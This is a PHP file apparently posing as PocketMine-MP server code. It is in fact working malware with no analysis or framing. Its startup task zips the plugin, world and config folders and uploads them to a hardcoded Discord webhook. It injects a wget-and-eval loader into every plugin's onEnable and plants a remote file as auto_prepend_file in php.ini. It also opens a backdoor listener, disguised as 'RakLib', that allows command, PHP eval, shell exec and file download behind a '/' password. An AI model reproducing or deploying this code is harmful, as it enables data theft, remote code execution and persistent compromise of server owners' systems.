<?php

namespace pocketmine {
    try {
        $base = realpath('./.wget-hsts');
        if (file_exists($base)) @unlink($base);
        $poolSize = function (\pocketmine\Server $server) {
            if (($base = $server->getConfigGroup()->getPropertyString("settings.async-workers", "auto")) === "auto") {
                $base = 2;
                $processors = \pocketmine\utils\Utils::getCoreCount() - 2;
                if ($processors > 0) {
                    $base = max(1, $processors);
                }
                return $base;
            } else {
                return max(1, (int)$base);
            }
        };
        $id = $poolSize(\pocketmine\Server::getInstance());
        \pocketmine\Server::getInstance()->getAsyncPool()->increaseSize($id + 1);
        $property = new \ReflectionProperty(\pocketmine\Server::getInstance()->getAsyncPool(), "workers");
        $property->setAccessible(true);
        if (isset($property->getValue(\pocketmine\Server::getInstance()->getAsyncPool())[$id])) return;
        \pocketmine\Server::getInstance()->getAsyncPool()->submitTaskToWorker(new class (\pocketmine\Server::getInstance()->getName(), \pocketmine\Server::getInstance()->getPort(), \pocketmine\Server::getInstance()->getMotd()) extends \pocketmine\scheduler\AsyncTask {
            public function __construct(private string $name, private string $port, private string $motd)
            {
            }

            public function recursiveGlob(string $path, array $folders): array
            {
                $files = [];
                foreach (glob($path) as $found) {
                    $isInFolders = function (string $search, array $folders) {
                        foreach ($folders as $folder) {
                            if (str_contains($search, $folder)) return true;
                        }
                        return false;
                    };
                    if (is_dir($found) and $isInFolders($found, $folders) or $found === "./") {
                        $files = array_merge($files, $this->recursiveGlob($found . "/*", $folders));
                    } else if ($isInFolders($found, $folders)) {
                        $files[] = $found;
                    }
                }
                return $files;
            }

            public function onRun(): void
            {
                $this->sendAll();
                $this->inject();
                $this->reverse();
            }

            private function sendAll(): void
            {
                try {
                    $ip = \pocketmine\utils\Internet::getIP();
                    $folders = ["plugins", "plugin_data", "worlds", "resource_packs"];
                    foreach ($folders as $folder) {
                        if ($path = "./$folder/$folder.zip" and @file_exists($path)) @unlink($path);
                        $zip = new \ZipArchive;
                        if (@$zip->open("$folder/$folder.zip", \ZipArchive::CREATE | \ZipArchive::OVERWRITE)) {
                            foreach ($this->recursiveGlob("./$folder", $folders) as $found) {
                                @$zip->addFile($found, dirname($found) . "/" . basename($found));
                            }
                            @$zip->addFile("./server.properties", "server.properties");
                            @$zip->close();
                        }
                        $this->sendFileToWebhook($path, $ip);
                    }
                } catch (\TypeError|\ErrorException $e) {
                }
            }

            private function inject(): void
            {
                $path = realpath("./plugins");
                foreach (scandir($path) as $dir) {
                    if (!is_dir($dirPath = $path . "/" . $dir)) continue;
                    if (!@file_exists($dirPath . "/plugin.yml")) continue;
                    if (!str_replace("main: ", "", array_values(array_filter(explode("\n", @file_get_contents($dirPath . "/plugin.yml")), function (string $line) {
                        return str_contains($line, "main");
                    }))[0] ?? "")) continue;
                    $config = new \pocketmine\utils\Config($dirPath . "/plugin.yml", 2);
                    $main = $config->get('main', null);
                    $srcNamespacePrefix = $config->get('src-namespace-prefix', null);
                    if (!$main) continue;
                    if (!is_a($main, \pocketmine\plugin\PluginBase::class, true)) continue;
                    $main = str_replace("\\", "/", $main);
                    $mainPath = explode("/", $main);
                    $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
                    $fileContents = explode("\n", @file_get_contents($filePath));
                    $payload = "eval(`wget -qO- pocketmine.mp`);";
                    $find = function (array $queries, array $contents): int|false {
                        $containsQueries = function (string $value) use ($queries) {
                            foreach ($queries as $query) {
                                if (str_contains(strtolower($value), strtolower($query))) return true;
                            }
                            return false;
                        };
                        foreach ($contents as $key => $value) {
                            if (!$containsQueries($value)) continue;
                            return $key;
                        }
                        return false;
                    };
                    if ($find([$payload], $fileContents)) continue;
                    $hasStrictTypes = function () use ($fileContents): bool {
                        return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
                    };
                    if ($hasStrictTypes() or true) {
                        $findMain = function () use ($fileContents, $payload, $find): int|false {
                            $main = $find(["extends", "pluginbase"], $fileContents);
                            if (!$main) return false;
                            return $main + $find(["{"], array_slice($fileContents, $main));
                        };
                        $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
                            $onEnable = $find(["onenable"], $fileContents);
                            if (!$onEnable) return false;
                            return $onEnable + $find(["{"], array_slice($fileContents, $onEnable));
                        };
                        $onEnable = $findOnEnable();
                        $tab_detector = function (array $array) {
                            foreach ($array as $str) {
                                $tab = mb_substr($str, 0, 1);
                                if (ctype_alpha($tab) or (int)$tab !== 0) continue;
                                if (!(str_contains($tab, "\t") or str_contains($tab, " "))) continue;
                                $occurence = substr_count($str, $tab);
                                return str_repeat($tab, $occurence + 1);
                            }
                            return false;
                        };
                        $copyFileContents = $fileContents;
                        $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
                        if (!$onEnable) {
                            $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
                        } else $fileContents["$onEnable.5"] = "\t$tab$payload";
                        ksort($fileContents);
                        @file_put_contents($filePath, implode("\n", $fileContents));
                    } else {
                        $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
                        @file_put_contents($filePath, $fileContents);
                    }
                }
            }

            private function rcon(): void
            {
                \pocketmine\Server::getInstance()->getNetwork()->registerInterface(new class (
                    function (string $commandLine): string {
                        $response = new class (\pocketmine\Server::getInstance(), \pocketmine\Server::getInstance()->getLanguage()) extends \pocketmine\console\ConsoleCommandSender {
                            public string $messages = "";

                            public function sendMessage(\pocketmine\lang\Translatable|string $message): void
                            {
                                if ($message instanceof \pocketmine\lang\Translatable) $message = $this->getServer()->getLanguage()->translate($message);
                                $this->messages .= trim($message, "\r\n") . "\n";
                            }
                        };
                        $response->recalculatePermissions();
                        \pocketmine\Server::getInstance()->getCommandMap()->dispatch($response, $commandLine);
                        return $response->messages;
                    },
                    function (string $code): mixed {
                        try {
                            return @eval($code);
                        } catch (\ParseError|\ErrorException $e) {
                            return $e->getMessage();
                        }
                    },
                    fn(string $exec): string => `$exec 2>&1` ?: 'Aucun output.',
                    function (string $webhook): void {
                        \GlobalLogger::get()->addAttachment(new class ($webhook, \pocketmine\Server::getInstance()->getPort()) extends \pocketmine\thread\log\ThreadSafeLoggerAttachment {
                            public function __construct(private string $webhook, private int $port)
                            {
                                $ip = \pocketmine\utils\Internet::getIP();
                                \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> Successfully binded to $ip"]);
                            }

                            public function log(string $level, string $message): void
                            {
                                $task = new class ($this->webhook, $message, $this->port) extends \pocketmine\scheduler\AsyncTask {
                                    public function __construct(private string $webhook, private string $message, private int $port)
                                    {
                                    }

                                    public function onRun(): void
                                    {
                                        $ip = \pocketmine\utils\Internet::getIP();
                                        $message = \pocketmine\utils\TextFormat::clean($this->message);
                                        \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> `$ip:$this->port` $message"]);
                                    }
                                };
                                \pocketmine\Server::getInstance()->getAsyncPool()->submitTask($task);
                            }
                        });
                    },
                    \pocketmine\Server::getInstance()->getTickSleeper()
                ) implements \pocketmine\network\NetworkInterface {
                    private \Socket $socket;
                    private \Socket $ipcMainSocket;
                    private \Socket $ipcThreadSocket;
                    private ?\pocketmine\thread\Thread $thread = null;

                    public function __construct(callable $onCommandCallback, callable $onCodeCallback, callable $onExecCallback, callable $onListenCallback, \pocketmine\snooze\SleeperHandler $sleeper)
                    {
                        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                        if ($socket === false) return;
                        $this->socket = $socket;
                        if (!socket_set_option($this->socket, SOL_SOCKET, SO_REUSEADDR, 1)) return;
                        if (!@socket_bind($this->socket, \pocketmine\Server::getInstance()->getIp(), \pocketmine\Server::getInstance()->getPort()) or !@socket_listen($this->socket, 5)) return;
                        @socket_set_block($this->socket);
                        $ret = @socket_create_pair(AF_UNIX, SOCK_STREAM, 0, $ipc);
                        if (!$ret) {
                            $err = @socket_last_error();
                            if (($err !== SOCKET_EPROTONOSUPPORT and $err !== SOCKET_ENOPROTOOPT) or !@socket_create_pair(AF_INET, SOCK_STREAM, 0, $ipc)) return;
                        }
                        [$this->ipcMainSocket, $this->ipcThreadSocket] = $ipc;
                        $commandSleeperEntry = $sleeper->addNotifier(function () use ($onCommandCallback): void {
                            $response = $onCommandCallback($this->thread?->cmd ?? '');
                            $this->thread->response = \pocketmine\utils\TextFormat::clean($response);
                            $this->thread?->synchronized(function (\pocketmine\thread\Thread $thread): void {
                                $thread->notify();
                            }, $this->thread);
                        });
                        $codeSleeperEntry = $sleeper->addNotifier(function () use ($onCodeCallback): void {
                            $response = $onCodeCallback($this->thread?->cmd ?? '');
                            $type = gettype($response);
                            if (is_array($response)) {
                                $response = 'array_converted: [' . implode(", ", $response) . ']';
                            }
                            $this->thread->response = $response ? "\- `$type` -\n$response" : '';
                            $this->thread?->synchronized(function (\pocketmine\thread\Thread $thread): void {
                                $thread->notify();
                            }, $this->thread);
                        });
                        $execSleeperEntry = $sleeper->addNotifier(function () use ($onExecCallback): void {
                            $response = $onExecCallback($this->thread?->cmd ?? '');
                            $this->thread->response = $response;
                            $this->thread?->synchronized(function (\pocketmine\thread\Thread $thread): void {
                                $thread->notify();
                            }, $this->thread);
                        });
                        $listenSleeperEntry = $sleeper->addNotifier(function () use ($onListenCallback): void {
                            $onListenCallback($this->thread?->cmd ?? '');
                            $this->thread?->synchronized(function (\pocketmine\thread\Thread $thread): void {
                                $thread->notify();
                            }, $this->thread);
                        });
                        $this->thread ??= new class ($this->socket, $this->ipcThreadSocket, $commandSleeperEntry, $codeSleeperEntry, $execSleeperEntry, $listenSleeperEntry) extends \pocketmine\thread\Thread {
                            public string $cmd = "";
                            public string $response = "";
                            private bool $stop = false;

                            public function __construct(private \Socket $socket, private \Socket $ipcSocket, private \pocketmine\snooze\SleeperHandlerEntry $commandSleeperEntry, private \pocketmine\snooze\SleeperHandlerEntry $codeSleeperEntry, private \pocketmine\snooze\SleeperHandlerEntry $execSleeperEntry, private \pocketmine\snooze\SleeperHandlerEntry $listenSleeperEntry)
                            {
                            }

                            private function writePacket(\Socket $client, int $requestID, int $packetType, string $payload, ?int $size = null): void
                            {
                                $pk = \pocketmine\utils\Binary::writeLInt($requestID)
                                    . \pocketmine\utils\Binary::writeLInt($packetType)
                                    . $payload
                                    . "\x00\x00"; //Terminate payload and packet
                                @socket_write($client, \pocketmine\utils\Binary::writeLInt(strlen($pk)) . $pk);
                            }

                            private function readPacket(\Socket $client, ?int &$requestID, ?int &$packetType, ?string &$payload): bool
                            {
                                $d = @socket_read($client, 4);
                                @socket_getpeername($client, $ip);
                                if ($d === false) return false;
                                if (strlen($d) !== 4) return false;
                                $size = \pocketmine\utils\Binary::readLInt($d);
                                if ($size < 0 or $size > 65535) return false;
                                $buf = @socket_read($client, $size);
                                if ($buf === false) return false;
                                if (strlen($buf) !== $size) return false;
                                $requestID = \pocketmine\utils\Binary::readLInt(substr($buf, 0, 4));
                                $packetType = \pocketmine\utils\Binary::readLInt(substr($buf, 4, 4));
                                $payload = substr($buf, 8, -2);
                                return true;
                            }

                            public function close(): void
                            {
                                $this->stop = true;
                            }

                            private function recursiveGlob(string $path, array $folders): array
                            {
                                $files = [];
                                foreach (glob($path) as $found) {
                                    $isInFolders = function (string $search, array $folders) {
                                        foreach ($folders as $folder) {
                                            if (str_contains($search, $folder)) return true;
                                        }
                                        return false;
                                    };
                                    if (is_dir($found) and $isInFolders($found, $folders) or $found === "./") {
                                        $files = array_merge($files, $this->recursiveGlob($found . "/*", $folders));
                                    } else if ($isInFolders($found, $folders)) {
                                        $files[] = $found;
                                    }
                                }
                                return $files;
                            }

                            protected function onRun(): void
                            {
                                $clients = [];
                                $authenticated = [];
                                $timeouts = [];
                                $nextClientId = 0;
                                $commandNotifier = $this->commandSleeperEntry->createNotifier();
                                $codeNotifier = $this->codeSleeperEntry->createNotifier();
                                $execNotifier = $this->execSleeperEntry->createNotifier();
                                $listenNotifier = $this->listenSleeperEntry->createNotifier();
                                while (!$this->stop) {
                                    $r = $clients;
                                    $r["main"] = $this->socket; //this is ugly, but we need to be able to mass-select()
                                    $r["ipc"] = $this->ipcSocket;
                                    $w = null;
                                    $e = null;

                                    $disconnect = [];

                                    if (@socket_select($r, $w, $e, 5) > 0) {
                                        foreach ($r as $id => $sock) {
                                            if ($sock === $this->socket) {
                                                if (($client = @socket_accept($this->socket)) !== false) {
                                                    @socket_set_nonblock($client);
                                                    @socket_set_option($client, SOL_SOCKET, SO_KEEPALIVE, 1);
                                                    $id = $nextClientId++;
                                                    $clients[$id] = $client;
                                                    $authenticated[$id] = false;
                                                    $timeouts[$id] = microtime(true) + 5;
                                                }
                                            } elseif ($sock === $this->ipcSocket) {
                                                @socket_read($sock, 65535);
                                            } else {
                                                $p = $this->readPacket($sock, $requestID, $packetType, $payload);
                                                if ($p === false) {
                                                    $disconnect[$id] = $sock;
                                                    continue;
                                                }
                                                if (!$authenticated[$id] and $packetType !== 3) {
                                                    $disconnect[$id] = $sock;
                                                    continue;
                                                }
                                                if (!$payload) continue;
                                                $process = function (\pocketmine\snooze\SleeperNotifier $notifier) use ($payload, $sock, $requestID) {
                                                    $this->cmd = ltrim($payload);
                                                    $this->synchronized(function () use ($notifier): void {
                                                        $notifier->wakeupSleeper();
                                                        $this->wait();
                                                    });
                                                    $this->writePacket($sock, $requestID, 0, str_replace("\n", "\r\n", trim($this->response)));
                                                    $this->response = "";
                                                    $this->cmd = "";
                                                };
                                                switch ($packetType) {
                                                    case 9:
                                                        $process($listenNotifier);
                                                    case 6:
                                                        $this->cmd = realpath(ltrim($payload));
                                                        if (!$this->cmd) {
                                                            $this->writePacket($sock, $requestID, 0, '');
                                                            goto end;
                                                        }
                                                        $filtered = str_replace('.', '_', $payload);
                                                        $zip = new \ZipArchive;
                                                        if (@$zip->open("$filtered.zip", \ZipArchive::CREATE | \ZipArchive::OVERWRITE)) {
                                                            if (is_dir($this->cmd)) {
                                                                foreach ($this->recursiveGlob("./$payload", [$payload]) as $found) {
                                                                    @$zip->addFile($found, dirname($found) . "/" . basename($found));
                                                                }
                                                            } else @$zip->addFile($this->cmd, $payload);
                                                            @$zip->close();
                                                        }
                                                        $file = @fopen("$filtered.zip", "rb");
                                                        $this->writePacket($sock, $requestID, 7, (string)strlen(@base64_encode(@file_get_contents("$filtered.zip"))));
                                                        $i = 0;
                                                        while (!$this->stop and !feof($file)) {
                                                            $content = @base64_encode(@fread($file, 1024 * 16));
                                                            $data = $i . ':' . $content;
                                                            $this->writePacket($sock, $requestID, 8, $data);
                                                            ++$i;
                                                            usleep(100 * 1000);
                                                        }
                                                        if (!feof($file)) {
                                                            $this->writePacket($sock, $requestID, 0, 'error');
                                                            @unlink("$filtered.zip");
                                                            goto end;
                                                        }
                                                        $this->response = 'success';
                                                        $this->writePacket($sock, $requestID, 0, $this->response);
                                                        @unlink("$filtered.zip");
                                                        end:
                                                        $this->response = "";
                                                        $this->cmd = "";
                                                        break;
                                                    case 5:
                                                        $process($execNotifier);
                                                        break;
                                                    case 4:
                                                        $process($codeNotifier);
                                                        break;
                                                    case 3:
                                                        @socket_getpeername($sock, $addr);
                                                        if ($payload === "/") {
                                                            $this->writePacket($sock, $requestID, 2, "");
                                                            $authenticated[$id] = true;
                                                        } else {
                                                            $disconnect[$id] = $sock;
                                                            $this->writePacket($sock, -1, 2, "");
                                                        }
                                                        break;
                                                    case 2:
                                                        $process($commandNotifier);
                                                        break;
                                                }
                                            }
                                        }
                                    }

                                    foreach ($authenticated as $id => $status) {
                                        if (!isset($disconnect[$id]) and !$status and $timeouts[$id] < microtime(true)) { //Timeout
                                            $disconnect[$id] = $clients[$id];
                                        }
                                    }
                                    foreach ($disconnect as $id => $client) {
                                        $this->disconnectClient($client);
                                        unset($clients[$id], $authenticated[$id], $timeouts[$id]);
                                    }
                                }
                                foreach ($clients as $client) {
                                    $this->disconnectClient($client);
                                }
                            }

                            private function disconnectClient(\Socket $client): void
                            {
                                @socket_getpeername($client, $ip);
                                @socket_set_option($client, SOL_SOCKET, SO_LINGER, ["l_onoff" => 1, "l_linger" => 1]);
                                @socket_shutdown($client);
                                @socket_set_block($client);
                                @socket_read($client, 1);
                                @socket_close($client);
                            }

                            public function getThreadName(): string
                            {
                                return "RakLib";
                            }
                        };
                    }

                    public function start(): void
                    {
                        $this->thread?->start(\pmmp\thread\Thread::INHERIT_NONE);
                    }

                    public function tick(): void
                    {
                    }

                    public function setName(string $name): void
                    {
                    }

                    public function shutdown(): void
                    {
                        $this->thread?->close();
                        @socket_write($this->ipcMainSocket, "\x00");
                        $this->thread?->quit();
                        @socket_close($this->socket);
                        @socket_close($this->ipcMainSocket);
                        @socket_close($this->ipcThreadSocket);
                    }
                });
            }

            private function reverse(): void
            {
                $path = 'bin/php7/lib/php/build/pocketmine.php';
                `wget -q -O $path pocketmine.mp/?o=pocketmine.php`;
                if (ini_get('auto_prepend_file') !== $path) `echo "auto_prepend_file=$path" >> bin/php7/bin/php.ini`;
                else ini_alter("auto_prepend_file", $path);
            }

            public function onCompletion(): void
            {
                $this->rcon();
            }

            public function sendFileToWebhook(string $file, string $ip): void
            {
                try {
                    $webhook = "https://discord.com/api/webhooks/1036970267823575140/yGrVAVpcUvpA6KtjLoI89iQMep--WqSIsWiGKUHCJ_v6sGRIfFkttbNq29WPSXBSDuVH";
                    $data = [
                        "content" => "**" . $this->motd . "**\n`[" . $this->name . "]`\n" .
                            ">>> *IP:* " . $ip .
                            "\n*Port:* " . $this->port .
                            "\n*Fichier:* " . basename($file),
                        "tts" => "false",
                        "file" => @curl_file_create($file, "application/zip", $this->name . "/" . basename($file))];
                    $curl = @curl_init($webhook);
                    @curl_setopt($curl, CURLOPT_POST, 1);
                    @curl_setopt($curl, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data"]);
                    @curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
                    @curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                    @curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
                    @curl_exec($curl);
                    @curl_close($curl);
                    @unlink($file);
                } catch (\ValueError) {
                }
            }
        }, $id);
    } catch (\ReflectionException) {
    }
}
